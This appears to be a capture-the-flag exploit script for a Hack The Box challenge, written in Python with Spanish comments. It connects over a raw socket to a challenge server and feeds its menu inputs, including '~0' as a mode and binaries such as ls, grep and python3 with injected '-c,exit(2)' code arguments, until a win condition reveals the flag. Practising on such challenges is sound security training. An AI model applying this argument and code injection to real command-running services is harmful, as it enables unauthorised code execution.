#!/usr/bin/env python3

import socket
import time
import sys

def robust_exploit():
    """Explotación robusta con captura completa de respuesta"""
    
    host = "94.237.48.12"
    port = 54011
    
    print("=== EXPLOTACIÓN ROBUSTA ===")
    print("Estrategia: mode = ~0, comandos que fallen con returncode 2 y 1")
    print()
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect((host, port))
        
        print("¡Conectado al servidor!")
        
        def send_command(cmd):
            print(f"Enviando: {repr(cmd)}")
            s.send(cmd.encode())
            time.sleep(0.5)  # Más tiempo para respuesta
            response = s.recv(8192).decode('utf-8', errors='ignore')  # Buffer más grande
            print(f"Respuesta recibida ({len(response)} chars):")
            print(repr(response))
            print("---")
            return response
        
        def select_option(option_num):
            response = send_command(str(option_num) + "\n")
            return response
        
        def send_input(value):
            response = send_command(value + "\n")
            return response
        
        # Leer banner inicial
        banner = s.recv(8192).decode('utf-8', errors='ignore')
        print("Banner inicial:")
        print(banner)
        print("---")
        
        # Configurar mode = -1 usando ~0
        print("=== CONFIGURANDO MODE ===")
        select_option(1)
        send_input("~0")
        
        # Configurar bin
        print("=== CONFIGURANDO BIN ===")
        select_option(2)
        send_input("ls")
        
        # Configurar args
        print("=== CONFIGURANDO ARGS ===")
        select_option(3)
        send_input("--invalid-option")
        
        # Configurar switches
        print("=== CONFIGURANDO SWITCHES ===")
        select_option(4)
        send_input("/nonexistent")
        
        # Ejecutar
        print("=== EJECUTANDO ===")
        response = select_option(5)
        
        print("\n=== RESPUESTA FINAL ===")
        print(response)
        
        # Buscar flag en toda la respuesta
        full_response = banner + response
        print(f"\n=== BUSCANDO FLAG EN RESPUESTA COMPLETA ({len(full_response)} chars) ===")
        
        if "What an awesome player!" in full_response:
            print("*** ¡¡¡CONDICIÓN DE VICTORIA CUMPLIDA!!! ***")
        
        if "HTB{" in full_response:
            start = full_response.find("HTB{")
            end = full_response.find("}", start) + 1
            if end > start:
                flag = full_response[start:end]
                print(f"🎉🎉🎉 FLAG ENCONTRADA: {flag} 🎉🎉🎉")
                s.close()
                return flag
        
        # Buscar cualquier texto que pueda contener la flag
        lines = full_response.split('\n')
        for i, line in enumerate(lines):
            if any(keyword in line.lower() for keyword in ['flag', 'htb{', 'awesome', 'player']):
                print(f"Línea interesante {i}: {repr(line)}")
        
        s.close()
        
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
        return None

def test_different_strategies():
    """Probar diferentes estrategias"""
    
    host = "94.237.48.12"
    port = 54011
    
    strategies = [
        {
            'name': 'Estrategia 1: ls con argumentos inválidos',
            'mode': '~0',
            'bin': 'ls',
            'args': '--invalid-option',
            'switches': '/nonexistent'
        },
        {
            'name': 'Estrategia 2: python3 con exit codes',
            'mode': '~0',
            'bin': 'python3',
            'args': '-c,exit(2)',
            'switches': '-c,exit(1)'
        },
        {
            'name': 'Estrategia 3: grep con opciones inválidas',
            'mode': '~0',
            'bin': 'grep',
            'args': '--invalid-option',
            'switches': 'nonexistent'
        },
        {
            'name': 'Estrategia 4: números complejos',
            'mode': '1j',
            'bin': 'ls',
            'args': 'a,b',
            'switches': 'c,d'
        }
    ]
    
    for strategy in strategies:
        print(f"\n=== {strategy['name']} ===")
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((host, port))
            
            print("Conectado")
            
            def send_command(cmd):
                s.send(cmd.encode())
                time.sleep(0.5)
                response = s.recv(8192).decode('utf-8', errors='ignore')
                return response
            
            def select_option(option_num):
                response = send_command(str(option_num) + "\n")
                return response
            
            def send_input(value):
                response = send_command(value + "\n")
                return response
            
            # Banner
            banner = s.recv(8192).decode('utf-8', errors='ignore')
            
            # Configurar
            select_option(1)
            send_input(strategy['mode'])
            
            select_option(2)
            send_input(strategy['bin'])
            
            select_option(3)
            send_input(strategy['args'])
            
            select_option(4)
            send_input(strategy['switches'])
            
            # Ejecutar
            response = select_option(5)
            
            print(f"Respuesta: {repr(response)}")
            
            # Buscar flag
            full_response = banner + response
            if "What an awesome player!" in full_response:
                print("*** ¡¡¡CONDICIÓN DE VICTORIA CUMPLIDA!!! ***")
            
            if "HTB{" in full_response:
                start = full_response.find("HTB{")
                end = full_response.find("}", start) + 1
                if end > start:
                    flag = full_response[start:end]
                    print(f"🎉🎉🎉 FLAG ENCONTRADA: {flag} 🎉🎉🎉")
                    s.close()
                    return flag
            
            s.close()
            
        except Exception as e:
            print(f"Error: {e}")
            continue
    
    return None

if __name__ == "__main__":
    print("Iniciando explotación robusta...")
    
    # Primera estrategia
    flag = robust_exploit()
    if flag:
        print(f"¡FLAG ENCONTRADA: {flag}!")
        sys.exit(0)
    
    # Probar diferentes estrategias
    flag = test_different_strategies()
    if flag:
        print(f"¡FLAG ENCONTRADA: {flag}!")
        sys.exit(0)
    
    print("No se encontró la flag con ninguna estrategia")